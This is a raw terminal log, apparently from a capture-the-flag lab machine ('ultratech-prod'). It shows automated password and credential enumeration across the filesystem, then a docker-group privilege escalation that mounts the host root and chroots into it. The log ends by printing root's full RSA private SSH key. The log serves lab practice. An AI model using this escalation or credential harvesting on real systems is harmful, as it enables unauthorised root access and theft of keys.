/var/log/dpkg.log:2019-02-14 09:49:32 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:34 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:39 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:39 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:39 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:41 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2019-02-14 09:49:41 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:41 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:41 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:43 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log:2019-02-14 09:49:43 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:43 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log:2019-02-14 09:49:43 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/installer/installer-journal.txt:Mar 19 14:30:23 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.

[+] Finding emails inside logs (limit 100)
      2 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home

[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/home/www/api/index.js
/home/www/api/node_modules/ajv/scripts/travis-gh-pages
/home/www/api/node_modules/aws4/README.md
/home/www/api/node_modules/bcrypt-pbkdf/README.md
/home/www/api/node_modules/.bin/sshpk-conv
/home/www/api/node_modules/.bin/sshpk-sign
/home/www/api/node_modules/debug/Makefile
/home/www/api/node_modules/debug/src/node.js
/home/www/api/node_modules/express/History.md
/home/www/api/node_modules/express/package.json
/home/www/api/node_modules/form-data/README.md
/home/www/api/node_modules/form-data/README.md.bak
/home/www/api/node_modules/getpass/lib/index.js
/home/www/api/node_modules/getpass/README.md
/home/www/api/node_modules/ini/README.md
/home/www/api/node_modules/needle/examples/digest-auth.js
/home/www/api/node_modules/needle/lib/needle.js
/home/www/api/node_modules/needle/README.md
/home/www/api/node_modules/needle/test/basic_auth_spec.js
/home/www/api/node_modules/needle/test/proxy_spec.js
/home/www/api/node_modules/needle/test/utils/test.js
/home/www/api/node_modules/node-pre-gyp/README.md
/home/www/api/node_modules/request/CHANGELOG.md
/home/www/api/node_modules/request/lib/auth.js
/home/www/api/node_modules/request/README.md
/home/www/api/node_modules/request/request.js
/home/www/api/node_modules/safe-buffer/README.md
/home/www/api/node_modules/safer-buffer/Porting-Buffer.md
/home/www/api/node_modules/shelljs/CHANGELOG.md
/home/www/api/node_modules/shelljs/commands.js
/home/www/api/node_modules/shelljs/README.md
/home/www/api/node_modules/shelljs/src/cd.js
/home/www/api/node_modules/shelljs/src/common.js
/home/www/api/node_modules/shelljs/src/dirs.js
/home/www/api/node_modules/shelljs/src/exec.js
/home/www/api/node_modules/shelljs/src/pwd.js
/home/www/api/node_modules/sshpk/bin/sshpk-conv
/home/www/api/node_modules/sshpk/bin/sshpk-sign
/home/www/api/node_modules/sshpk/lib/errors.js
/home/www/api/node_modules/sshpk/man/man1/sshpk-conv.1
/home/www/api/node_modules/sshpk/README.md
/home/www/api/node_modules/verror/README.md
/home/www/api/utech.db.sqlite
/home/www/.npm/express/4.16.4/package/package.json
/home/www/.npm/registry.npmjs.org/ajv/.cache.json
/home/www/.npm/registry.npmjs.org/aws4/.cache.json
/home/www/.npm/registry.npmjs.org/bcrypt-pbkdf/.cache.json
/home/www/.npm/registry.npmjs.org/express/.cache.json
/home/www/.npm/registry.npmjs.org/form-data/.cache.json
/home/www/.npm/registry.npmjs.org/getpass/.cache.json
/home/www/.npm/registry.npmjs.org/ini/.cache.json
/home/www/.npm/registry.npmjs.org/needle/.cache.json
/home/www/.npm/registry.npmjs.org/node-pre-gyp/.cache.json
/home/www/.npm/registry.npmjs.org/request/.cache.json
/home/www/.npm/registry.npmjs.org/safe-buffer/.cache.json
/home/www/.npm/registry.npmjs.org/setprototypeof/.cache.json
/home/www/.npm/registry.npmjs.org/shelljs/.cache.json
/home/www/.npm/registry.npmjs.org/sshpk/.cache.json
/home/www/.npm/registry.npmjs.org/string-width/.cache.json
/home/www/.npm/registry.npmjs.org/verror/.cache.json
/home/www/.npm/sqlite3/4.0.6/package.tgz
/var/www/html/css/style.css
/var/www/html/css/style.min.css
/var/www/html/partners.html
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
/etc/ssh/sshd_config:PasswordAuthentication yes

r00t@ultratech-prod:/tmp$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:/tmp$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        5 years ago         15.8MB
r00t@ultratech-prod:/tmp$ docker run -v /:/mnt --rm -it bash chroot /mnt sh


# # # whoami
root
# ls
bin   etc         initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
boot  home        lib             media       proc  sbin  swap.img  usr  vmlinuz.old
dev   initrd.img  lib64           mnt         root  snap  sys       var
# cd /root
# ls
private.txt
# cat private
cat: private: No such file or directory
# cat private.txt
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful

# cd /root/.ssh
# ls
authorized_keys  id_rsa  id_rsa.pub
# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4NKdrYXek7y8w48niXY/CksWoynLVJZhppESGKjriIzrkdKawg5+gQL6++z1JHHLzI0FDZvHaQtiqhmkMk65MLhjtUhv7fF4uOGa+01Aah99+RACNIwyWHUwbXh84idcpNFAXyE8FYoHfwE92U2Cbt1Hk9QYVaeLXm5xiAIarVS1zk881lXGKRr6mv9TRTHjrbQzMlbz32UMbqisigmjvf1+YzKtBSMpGenzFcG/9h7OgXwOFBo/uia1vKjR1zMoaR4BUJ7oBGHzCiJV3bPPlIcOh5kt7WWfgpJsgvcSIxAzM6lyM2fugP6uqaH/KChcvfIVECjCL4sV2SRLSCqCb root@ultratech-prod
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
#
